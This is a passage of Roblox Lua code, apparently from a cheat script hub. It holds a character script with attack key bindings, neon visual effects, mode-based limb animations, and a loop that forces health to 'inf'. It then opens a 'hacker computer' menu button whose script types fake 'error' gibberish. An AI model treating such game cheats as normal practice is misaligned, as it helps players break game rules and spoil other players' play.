		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,LeftHole.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = -5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 1})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,LeftHole.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 1})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = Hole.CFrame, MoveToPos = Hole.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = Hole.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 904440937, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 1})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,Hole.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = -5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 1})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,Hole.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 1})
		for i=0, 0.10, 0.1 / Animation_Speed do
			Swait()
		    RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 3) * ANGLES(RAD(-12), RAD(MRANDOM(-25,25)), RAD(0)), 2 / Animation_Speed)
		    Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-45), RAD(MRANDOM(-25,25)), RAD(0)), 2 / Animation_Speed)
		    RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0.1) * ANGLES(RAD(90), RAD(MRANDOM(-25,25)), RAD(0)) * RIGHTSHOULDERC0, 2 / Animation_Speed)
		    LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0.1) * ANGLES(RAD(90), RAD(MRANDOM(-25,25)), RAD(0)) * LEFTSHOULDERC0, 2 / Animation_Speed)
            RightHip.C0 = Clerp(RightHip.C0, CF(1, 0, -1) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 2 / Animation_Speed)
            LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -0.6, -0.3) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 2 / Animation_Speed)
		end
	until KEYHOLD == false
	ATTACK = false
	Rooted = false
end

--//=================================\\
--||	  ASSIGN THINGS TO KEYS
--\\=================================//

function MouseDown(Mouse)
	if ATTACK == false then
	Shot()
	end
end

function MouseUp(Mouse)
HOLD = false
end

function KeyDown(Key)
	KEYHOLD = true
	if Key == "z" and ATTACK == false then
		Shot()
	end

	if Key == "t" and ATTACK == false then
		Attack()
	end

	if Key == "b" and ATTACK == false then
		Switch1()
	end

	if Key == "r" and ATTACK == false then
		AttackTemplate()
	end

	if Key == "c" and ATTACK == false then
		Shot2()
	end

	if Key == "e" and ATTACK == false then
		PurgeCombo()
	end

	if Key == "v" and ATTACK == false then
		Switch2()
	end

	if Key == "q" and ATTACK == false then
		Shot3()
	end

	if Key == "f" and ATTACK == false then
		VoidMagic()
	end

	if Key == "u" and ATTACK == false then
		Switch5()
	end
	
	if Key == "h" and ATTACK == false then
		Shot8()
	end

	if Key == "x" and ATTACK == false then
		Switch3()
	end
end

function KeyUp(Key)
	KEYHOLD = false
end

	Mouse.Button1Down:connect(function(NEWKEY)
		MouseDown(NEWKEY)
	end)
	Mouse.Button1Up:connect(function(NEWKEY)
		MouseUp(NEWKEY)
	end)
	Mouse.KeyDown:connect(function(NEWKEY)
		KeyDown(NEWKEY)
	end)
	Mouse.KeyUp:connect(function(NEWKEY)
		KeyUp(NEWKEY)
	end)

--//=================================\\
--\\=================================//


function unanchor()
	if UNANCHOR == true then
		g = Character:GetChildren()
		for i = 1, #g do
			if g[i].ClassName == "Part" then
				g[i].Anchored = false
			end
		end
	end
end


--//=================================\\
--||	WRAP THE WHOLE SCRIPT UP
--\\=================================//

INSTANT = false

Humanoid.Changed:connect(function(Jump)
	if Jump == "Jump" and (Disable_Jump == true) then
		Humanoid.Jump = false
	end
end)

local CONNECT = nil

while true do
	Swait()
	ANIMATE.Parent = nil
	if Character:FindFirstChildOfClass("Humanoid") == nil then
		Humanoid = IT("Humanoid",Character)
	end
	for _,v in next, Humanoid:GetPlayingAnimationTracks() do
	    v:Stop();
	end
	SINE = SINE + CHANGE
	local TORSOVELOCITY = (RootPart.Velocity * VT(1, 0, 1)).magnitude
	local TORSOVERTICALVELOCITY = RootPart.Velocity.y
	local HITFLOOR = Raycast(RootPart.Position, (CF(RootPart.Position, RootPart.Position + VT(0, -1, 0))).lookVector, 4, Character)
	local WALKSPEEDVALUE = 6 / (Humanoid.WalkSpeed / 16)
	if ANIM == "Walk" and TORSOVELOCITY > 1 then
		RootJoint.C1 = Clerp(RootJoint.C1, ROOTC0 * CF(0, 0, -0.15 * COS(SINE / (WALKSPEEDVALUE / 2))) * ANGLES(RAD(0), RAD(0) - RootPart.RotVelocity.Y / 75, RAD(0)), 2 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
		Neck.C1 = Clerp(Neck.C1, CF(0, -0.5, 0) * ANGLES(RAD(-90), RAD(0), RAD(180)) * ANGLES(RAD(2.5 * SIN(SINE / (WALKSPEEDVALUE / 2))), RAD(0), RAD(0) - Head.RotVelocity.Y / 30), 0.2 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
		RightHip.C1 = Clerp(RightHip.C1, CF(0.5, 0.875 - 0.125 * SIN(SINE / WALKSPEEDVALUE) - 0.15 * COS(SINE / WALKSPEEDVALUE*2), -0.125 * COS(SINE / WALKSPEEDVALUE) +0.2+ 0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0) - RightLeg.RotVelocity.Y / 75, RAD(0), RAD(76 * COS(SINE / WALKSPEEDVALUE))), 0.2 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
		LeftHip.C1 = Clerp(LeftHip.C1, CF(-0.5, 0.875 + 0.125 * SIN(SINE / WALKSPEEDVALUE) - 0.15 * COS(SINE / WALKSPEEDVALUE*2), 0.125 * COS(SINE / WALKSPEEDVALUE) +0.2+ -0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0) + LeftLeg.RotVelocity.Y / 75, RAD(0), RAD(76 * COS(SINE / WALKSPEEDVALUE))), 0.2 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
	elseif (ANIM ~= "Walk") or (TORSOVELOCITY < 1) then
		RootJoint.C1 = Clerp(RootJoint.C1, ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
		Neck.C1 = Clerp(Neck.C1, CF(0, -0.5, 0) * ANGLES(RAD(-90), RAD(0), RAD(180)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
		RightHip.C1 = Clerp(RightHip.C1, CF(0.5, 1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
		LeftHip.C1 = Clerp(LeftHip.C1, CF(-0.5, 1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
	end
	if TORSOVERTICALVELOCITY > 1 and HITFLOOR == nil then
		ANIM = "Jump"
		if ATTACK == false then
			RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-20), RAD(0), RAD(0)), 0.2 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(45), RAD(0), RAD(25))* RIGHTSHOULDERC0, 0.15 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-40), RAD(0), RAD(-20)) * LEFTSHOULDERC0, 0.2 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, -0.3) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-5), RAD(0), RAD(-20)), 0.2 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, -0.3) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-5), RAD(0), RAD(20)), 0.2 / Animation_Speed)
	    end
	elseif TORSOVERTICALVELOCITY < -1 and HITFLOOR == nil then
		ANIM = "Fall"
		if ATTACK == false then
			RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0, 0, 0 ) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0 , 0 + ((1) - 1)) * ANGLES(RAD(20), RAD(0), RAD(0)), 0.2 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(45), RAD(0), RAD(25))* RIGHTSHOULDERC0, 0.15 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-60)) * LEFTSHOULDERC0, 0.2 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(20)), 0.2 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(10)), 0.2 / Animation_Speed)
		end
	elseif TORSOVELOCITY < 1 and HITFLOOR ~= nil then
		ANIM = "Idle"
		if ATTACK == false then
			if MODE == "Insan" then
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-45)), 0.15 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(45)), 0.15 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.35, 0.5, -0.5) * ANGLES(RAD(75), RAD(45), RAD(-25))* RIGHTSHOULDERC0, 0.15 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.25, 0.5, 0.5) * ANGLES(RAD(-45), RAD(0), RAD(45)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-50), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			elseif MODE == "Insan2" then
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-45)), 0.15 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(MRANDOM(-25,25)), RAD(45)), 0.15 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.1, -0.4) * ANGLES(RAD(150), RAD(MRANDOM(-25,25)), RAD(MRANDOM(-25,25)))* RIGHTSHOULDERC0, 0.15 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.1, -0.4) * ANGLES(RAD(150), RAD(MRANDOM(-25,25)), RAD(MRANDOM(-25,25)))* LEFTSHOULDERC0, 0.15 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-50), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			elseif MODE == "Insan5" then
		    RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 3) * ANGLES(RAD(MRANDOM(-25,25)), RAD(0), RAD(0)), 1 / Animation_Speed)
		    Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(MRANDOM(-25,25)), RAD(MRANDOM(-25,25)), RAD(0)), 1 / Animation_Speed)
		    RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0.1) * ANGLES(RAD(90), RAD(MRANDOM(-25,25)), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
		    LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0.1) * ANGLES(RAD(90), RAD(MRANDOM(-25,25)), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
            RightHip.C0 = Clerp(RightHip.C0, CF(1, 0, -1) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
            LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -0.6, -0.3) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			elseif MODE == "Insan3" then
							RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-45)), 0.15 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(45)), 0.15 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.1, -0.4) * ANGLES(RAD(180), RAD(0 - 10 * SIN(SINE / 12)), RAD(0))* RIGHTSHOULDERC0, 0.15 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-0.5, 0.5, -0.4) * ANGLES(RAD(0), RAD(0 - 10 * SIN(SINE / 12)), RAD(90)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 22), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		        LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 22), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			elseif MODE == "Insan4" then
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 4.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.1, -0.4) * ANGLES(RAD(150), RAD(0), RAD(0))* RIGHTSHOULDERC0, 0.15 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.1, -0.4) * ANGLES(RAD(150), RAD(0), RAD(0))* LEFTSHOULDERC0, 0.15 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 22), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		       LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 22), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
	if VALUE1 == false and MRANDOM(1,50) == 1 then
				coroutine.resume(coroutine.create(function()
					VALUE1 = true
					for i = 1, 1 do
						Swait()
					local POS = RootPart.Position
			for i = 1, 5 do
				WACKYEFFECT({
					Time = 65,
					EffectType = "Sphere",
					Size = VT(2, 2, 2),
					Size2 = VT(0, 0, 20),
					Transparency = 1,
					Transparency2 = 0,
					CFrame = CF(POS),
					MoveToPos = nil,
					RotationX = MRANDOM(-2, 2),
					RotationY = MRANDOM(-12, 12),
					RotationZ = MRANDOM(-2, 2),
					Material = "Neon",
					Color = C3(1, 0, 0),
					SoundID = nil,
					SoundPitch = nil,
					SoundVolume = nil
				})
			end
					end
		VALUE1 = false
				end))
			end
			end
			end
	elseif TORSOVELOCITY > 1 and HITFLOOR ~= nil then
		ANIM = "Walk"
		if ATTACK == false then
			if MODE == "Insan" then
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.1) * ANGLES(RAD(5), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(5 - 8 * SIN(SINE / (WALKSPEEDVALUE / 2))), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.1, -0.4) * ANGLES(RAD(150), RAD(0), RAD(0))* RIGHTSHOULDERC0, 0.15 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-60 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(-5)) * LEFTSHOULDERC0, 0.35 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 2 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(15)), 2 / Animation_Speed)
			elseif MODE == "Insan2" then
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.1) * ANGLES(RAD(5), RAD(MRANDOM(-25,25)), RAD(0)), 0.15 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(5 - 8 * SIN(SINE / (WALKSPEEDVALUE / 2))), RAD(0),RAD(MRANDOM(-25,25))), 0.15 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.1, -0.4) * ANGLES(RAD(150), RAD(0), RAD(0))* RIGHTSHOULDERC0, 0.15 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.1, -0.4) * ANGLES(RAD(150), RAD(0), RAD(0))* LEFTSHOULDERC0, 0.15 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 2 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(15)), 2 / Animation_Speed)
			elseif MODE == "Insan3" then
							RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.1) * ANGLES(RAD(5), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(5 - 8 * SIN(SINE / (WALKSPEEDVALUE / 2))), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.1, -0.4) * ANGLES(RAD(180), RAD(0), RAD(0))* RIGHTSHOULDERC0, 0.15 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-0.5, 0.5, -0.4) * ANGLES(RAD(0), RAD(0), RAD(90)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 2 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(15)), 2 / Animation_Speed)
			elseif MODE == "Insan4" then
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.4 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(45), RAD(0), RAD(0)), 0.15 / Animation_Speed)
	 		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-25), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.1, -0.4) * ANGLES(RAD(150), RAD(0), RAD(0))* RIGHTSHOULDERC0, 0.15 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.1, -0.4) * ANGLES(RAD(150), RAD(0), RAD(0))* LEFTSHOULDERC0, 0.15 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1 - 0.15 * COS(SINE / WALKSPEEDVALUE*2), -0.2+ 0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 2 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.15 * COS(SINE / WALKSPEEDVALUE*2), -0.2+ -0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(15)), 2 / Animation_Speed)
						elseif MODE == "Insan5" then
		    RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 3) * ANGLES(RAD(45), RAD(MRANDOM(-25,25)), RAD(0)), 1 / Animation_Speed)
		    Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-45), RAD(MRANDOM(-25,25)), RAD(0)), 1 / Animation_Speed)
		    RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0.1) * ANGLES(RAD(90), RAD(MRANDOM(-25,25)), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
		    LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0.1) * ANGLES(RAD(90), RAD(MRANDOM(-25,25)), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
            RightHip.C0 = Clerp(RightHip.C0, CF(1, 0, -1) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
            LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -0.6, -0.3) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
			end
	unanchor()
	Humanoid.MaxHealth = "inf"
	Humanoid.Health = "inf"
	if Rooted == false then
		Disable_Jump = false
		Humanoid.WalkSpeed = Speed
	elseif Rooted == true then
		Disable_Jump = true
		Humanoid.WalkSpeed = 0
	end
	end
	Humanoid.PlatformStand = false
	if INTRO == false and INSTANT == false then
		INTRO = true
		coroutine.resume(coroutine.create(function()
			sick:Play()
			Intro()
		end))
	end
	if INSTANT == true then
		if TRANSFORMED == false then
			sick.TimePosition = 60
			sick:Play()
		end
		TRANSFORMED = true
	end
	script.Parent = PlayerGui
	Character.Parent = workspace
	Humanoid.Parent = Character
end
--//=================================\\
--\\=================================//





--//====================================================\\--
--||			  		 END OF SCRIPT
--\\====================================================//--

  	end    

})

Tab:AddButton({

	Name = "黑客电脑",

	Callback = function()

     
-- RBX.Lua LocalScript | Hackerman | xDarkScripter


local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local Player = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local Mouse = Player:GetMouse()

local Character = Player.Character
local Torso = Character.Torso

local Typing = false
local TypingSub = 1
local TypingSub2 = 1

local Neck = Torso.Neck

Neck.C1 = CFrame.new(0, -0.5, 0)

local RightArm = Character["Right Arm"]
local LeftArm = Character["Left Arm"]

local RightShoulder = Instance.new("Weld", Torso)
RightShoulder.Part0 = Torso
RightShoulder.Part1 = RightArm

local LeftShoulder = Instance.new("Weld", Torso)
LeftShoulder.Part0 = Torso
LeftShoulder.Part1 = LeftArm

RightShoulder.C1 = CFrame.new(-0.5, 0.5, 0)
LeftShoulder.C1 = CFrame.new(0.5, 0.5, 0)


local Code = [[
error-261 resolved0
error-340903-3455-34-5-749353230935-3095-234-9102-33-34-3-2349-02394-02934-0-2
error-934-03---04966-049-5060-609-4-604-60945-9604--09-60459-045-694-43
error--5-96-450---45096-4056-09-04-596-049-0956-094-0956-049-59-096-49-564-5-4506-9-045-69-094-69-04
error-606904-596-00-45-69-05-96090-54-6904956094596-0495-0-9-049-49-095-96096-49
error-324--9053-95-09-09-6-94056-3094-2934-092-209-409-34490-2
error--4305--0906-59-0694-5064-95-394-034-93-4955-05496-239-2309-069-40965-34923043-39
error-055-330904-023904-02934-09429034-09-09-29-3049-23094-0293-9-4092-3094-20934-02
error-350-395-09-595-0394-509-34095-09-0304590-09-395-485-405-35093-45093495-039405
error--59034-50-3095-039-09-5903-495-039-509-03094-5093-4059-03945-904-3095-3590-
error-3-09-3950-39-50394-59-3409-093-09-095-0349-509359-3095-0395-093-4095-03945-0934-5
error--350-0-04569-096-6409-694-06-409-0496-049-69-49-6904-9506-49069-495-6
end
	
	
	
	
]]


local Argument = [[
-Enagaging Aero Power-dislocating hacks-error:3366-revamping error.Value.Deleted
error-kill:PenguinFred-False-Shutdown-True-error
error=3990-390-030-80-359-305934----3485-34503-409-0964-5049-345
error--456-459640---95-96--96-5456-045-090-4095-05946-
error-5-64560460985645640689-46-45-6-4305-34509-359-039-4905-093-409-09-509-340
localscript=true-4-54-5-3345--3405934-5-03945-09-09-394-509
error-34-3-45-3-93-09-50-340-30459-95-03495---3495-039049-3-59-359-0395-
fixed-true-error-4309584-684-9-6-495-0-9-0496-099-6049-609-4-96-49-
error-340903-3455-34-5-749353230935-3095-234-9102-33-34-3-2349-02394-02934-0-2
error-934-03---04966-049-5060-609-4-604-60945-9604--09-60459-045-694-43
error--5-96-450---45096-4056-09-04-596-049-0956-094-0956-049-59-096-49-564-5-4506-9-045-69-094-69-04
error-606904-596-00-45-69-05-96090-54-6904956094596-0495-0-9-049-49-095-96096-49
error-324--9053-95-09-09-6-94056-3094-2934-092-209-409-34490-2
error--4305--0906-59-0694-5064-95-394-034-93-4955-05496-239-2309-069-40965-34923043-39
error-055-330904-023904-02934-09429034-09-09-29-3049-23094-0293-9-4092-3094-20934-02
error-350-395-09-595-0394-509-34095-09-0304590-09-395-485-405-35093-45093495-039405
